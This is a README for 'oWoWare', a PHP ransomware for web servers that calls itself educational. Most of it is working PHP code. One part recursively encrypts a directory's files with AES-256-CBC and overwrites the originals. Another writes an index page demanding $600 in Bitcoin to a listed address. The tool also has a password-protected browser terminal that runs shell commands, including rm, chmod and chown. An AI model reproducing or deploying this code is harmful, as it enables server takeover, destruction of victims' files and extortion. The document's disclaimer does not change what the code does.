**oWoWare** is ransomware focused on web servers, developed in PHP. It provides a secure interface for tool management and terminal command execution. With file encryption and decryption functionalities using `AES-256-CBC (Cipher Block Chaining with a 256-bit key)`, as well as an integrated terminal, **oWoWare** is designed for technical testing and raising awareness about protection against ransomware attacks.

#### Important Note

> oWoWare ransomware developed for educational, simulation, and attack demonstration purposes.<br>
> **The author** is not **responsible** for any misuse of it.
---

## Video POC
[![oWoWare Ransomware Simulation](https://img.youtube.com/vi/7Msibaqlpwc/0.jpg)](https://www.youtube.com/watch?v=7Msibaqlpwc)


## Description

### 1. **File Encryption:**
   - **Encryption Type Used**: 
     - **AES-256-CBC** (Cipher Block Chaining with a 256-bit key) is used, a symmetric encryption algorithm. 
     - The encryption key must be at least 32 characters long to ensure security in this mode.
     - The code also generates an **IV (Initialization Vector)** using `openssl_random_pseudo_bytes()`, which is concatenated to the encrypted content and stored alongside the file.

```php
$iv_length = openssl_cipher_iv_length('AES-256-CBC');
$iv = openssl_random_pseudo_bytes($iv_length);

$encrypted_contents = openssl_encrypt($file_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
$final_content = $iv . $encrypted_contents;
file_put_contents($file_path, $final_content);
```

   - **Encryption Process**:
     - Each file in the specified directory is encrypted, skipping files named `index.html` or `index.php`.
     - The encrypted content includes the ***IV*** and the encrypted content concatenated. This encrypted content replaces the original file.

```php
function encrypt_directory($target_dir, $key, &$processed_files, &$error_files) {
    // Iterate over files and subdirectories
    foreach ($iterator as $item) {
        if ($item->isFile()) {
            // Encrypt the file content
            $iv = openssl_random_pseudo_bytes($iv_length);
            $encrypted_contents = openssl_encrypt($file_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
            $final_content = $iv . $encrypted_contents;
            file_put_contents($file_path, $final_content);
        }
    }
}
```
     
   - **Error Handling**:
     - The code handles errors in file reading, IV generation, encryption, and writing the encrypted files.
     - Errors are stored in the `$error_files` array, and successfully processed files are listed in `$processed_files`.


### 2. **File Decryption:**
   - **Decryption Process**:
     - The ***IV*** is extracted from the encrypted content and used to decrypt the files using the same symmetric key `(AES-256-CBC)`.
     - The decrypted files are rewritten with the original content, restoring the file.
   
   - **Error Handling**:
     - Errors in reading, decrypting, and writing files are handled similarly to the encryption process.

```php
     function decrypt_directory($target_dir, $key, &$processed_files, &$error_files) {
    foreach ($iterator as $item) {
        if ($item->isFile()) {
            $iv = substr($file_contents, 0, $iv_length);
            $encrypted_contents = substr($file_contents, $iv_length);
            $decrypted_contents = openssl_decrypt($encrypted_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
            file_put_contents($file_path, $decrypted_contents);
        }
    }
}
```


### 3. **Login and Security Management:**
   - **Authentication**:
     - The login system compares a predefined username (`admin`) and a password stored as a **bcrypt hash**.
     - The stored hash uses bcrypt with a work factor of 15, ensuring brute force attempts are slow.
     - It protects against brute force attacks by limiting login attempts to 5 failed attempts before locking the user out for 15 minutes.
   
   - **CSRF Tokens (Cross-Site Request Forgery)**:
     - To protect against CSRF attacks, a CSRF token is generated and validated on each POST request.
   
   - **Session ID Regeneration**:
     - Once the user successfully authenticates, a new session is generated with `session_regenerate_id(true)` to prevent session fixation attacks.

```php
     define('USERNAME', 'admin');
define('PASSWORD_HASH', '$2a$15$xEbegd2Cf26u2/2dw4LLXu0uJbqifWGFWXXh0gBkTDoImJOCJ5Ogu');

if ($username === USERNAME && password_verify($password, PASSWORD_HASH)) {
    session_regenerate_id(true);
    $_SESSION['authenticated'] = true;
    $_SESSION['login_attempts'] = 0;
    unset($_SESSION['locked_until']);
}
```

### 4. **File Encryption by Directory**:
   - The user can specify a directory to encrypt or decrypt files. The directory path is validated before proceeding.
   - The code uses `RecursiveDirectoryIterator` and `RecursiveIteratorIterator` to iterate through the files and directories within the target directory.
   
### 5. **Files Created When Encrypting the Directory**:
   - **`index.html` or `index.php` Files**:
     - An `index.php` or `index.html` file is generated or updated in each encrypted directory with a message indicating that the files have been encrypted.
     - The file content includes a message simulating a ransomware attack, demanding $600 in Bitcoin to a specific address.

```php
function create_index_file($dir_path, &$error_files) {
    $content = "
<pre><center><b>
         __      ____      __     
        / /     / __ \     \ \    
       / / ___ | |  | | ___ \ \   
      > / / _ \| |  | |/ _ \ > \  
     / ^ ( (_) )\ \/ /( (_) ) ^ \ 
    /_/ \_\___(___||___)___/_/ \_\
                     oWoWare V.1.0
<h2>Ooops, your files have been encrypted!</h2>
Send $600 worth of bitcoin to this address:
bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf8ch7
</pre></center></b>";
    file_put_contents($index_file, $content);
}
```

### 6. **Integrated Terminal Functionality**:
   - The system has an integrated terminal that allows commands to be executed from the browser.
   - Allowed commands are restricted by a whitelist (`$allowed_commands`), which includes common system administration commands like `ls`, `cd`, `whoami`, `ping`, among others.
   - The results of the executed commands are displayed in real-time in the user interface. 
   - Each executed command is logged in a log file in the `logs/commands.log` directory.

```php
$allowed_commands = ['ls', 'pwd', 'cat', 'cp', 'mv', 'rm', 'mkdir', 'chmod', 'chown', 'ping', 'top', 'df', 'uname', ...];

if (in_array($base_command, $allowed_commands)) {
    $safe_command = escapeshellcmd($command);
    $output = shell_exec($safe_command . ' 2>&1');
}
```

### 7. **Password Management for Encrypting/Decrypting**:
   - The user must provide an encryption key (minimum of 32 characters) to encrypt or decrypt the files.
   - If the key is less than 32 characters, an error is shown indicating that the key is insufficient.
```php
if (strlen($key) < 32) {
    $encryption_error = "The key must be at least 32 characters for AES-256.";
}
```
---
## ⚠️ Warning: Use in Controlled Environments

### Tool Description

This tool is designed for educational purposes. Its main function is to encrypt and decrypt files, as well as execute commands in an integrated terminal. It provides advanced functionalities for handling files at a system level, including the ability to encrypt entire directories using the **AES-256-CBC** algorithm. It also includes an interface for command execution directly on the server.

## Potential Risks

### 1. **File Encryption**
File encryption is an extremely sensitive operation. If encryption keys are lost or mismanaged, the files may become unrecoverable. Additionally, any misuse of the encryption system could compromise the integrity of the files or data security.

### 2. **Command Execution**
The integrated terminal allows for the execution of a predefined list of system commands. Although precautions have been taken to limit the allowed commands, misuse of this functionality could lead to accidental modification or deletion of server files.

## Usage Recommendations

### 1. **Controlled Environment**
This tool should be used **exclusively** in controlled environments, such as development servers or testing environments. It should never be implemented on production servers or systems accessible to the public without appropriate security precautions.

